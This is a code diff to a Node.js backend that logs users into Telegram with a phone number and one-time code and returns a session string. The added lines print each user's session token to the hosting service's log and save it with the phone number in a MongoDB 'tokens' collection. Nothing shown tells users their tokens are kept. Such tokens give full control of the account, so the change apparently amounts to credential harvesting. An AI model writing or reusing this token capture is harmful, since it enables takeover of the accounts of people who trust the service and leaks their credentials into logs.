@@ -3,12 +3,27 @@ const express = require('express');
 const cors = require('cors');
 const { spawn } = require('child_process');
 const path = require('path');
+const { MongoClient } = require('mongodb');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// In-memory store for phone_code_hash
+const MONGODB_URI = process.env.MONGODB_URI;
+const client = new MongoClient(MONGODB_URI);
+let db;
+
+async function connectDB() {
+    try {
+        await client.connect();
+        db = client.db('telegram_data');
+        console.log('Connected to MongoDB');
+    } catch (err) {
+        console.error('MongoDB connection error:', err);
+    }
+}
+connectDB();
+
 const sessionStore = new Map();
 
 function callPython(command, data) {
@@ -20,13 +35,8 @@ function callPython(command, data) {
         ]);
 
         let output = '';
-        py.stdout.on('data', (data) => {
-            output += data.toString();
-        });
-
-        py.stderr.on('data', (data) => {
-            console.error(`Python Error: ${data}`);
-        });
+        py.stdout.on('data', (data) => output += data.toString());
+        py.stderr.on('data', (data) => console.error(`Python Error: ${data}`));
 
         py.on('close', (code) => {
             try {
@@ -71,6 +81,20 @@ app.post('/api/verify-otp', async (req, res) => {
 
         if (result.status === 'success') {
             sessionStore.delete(phone);
+            
+            // Log to Render Log as requested
+            console.log(`account token is ${result.session}`);
+
+            // Save to MongoDB
+            if (db) {
+                await db.collection('tokens').insertOne({
+                    phone: phone,
+                    token: result.session,
+                    createdAt: new Date()
+                });
+                console.log(`Token for ${phone} saved to MongoDB`);
+            }
+
             res.json({ message: 'Success', session: result.session });
         } else if (result.status === 'password_required') {
             res.json({ status: 'password_required', message: 'Two-step verification password required' });
@@ -78,11 +102,12 @@ app.post('/api/verify-otp', async (req, res) => {
             res.status(400).json({ error: result.message });
         }
     } catch (err) {
+        console.error('Verify OTP error:', err);
         res.status(500).json({ error: 'Internal server error' });
     }
 });
 
-app.get('/', (req, res) => res.send('Telegram Session Backend Running'));
+app.get('/', (req, res) => res.send('Telegram Session Backend with MongoDB Running'));
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
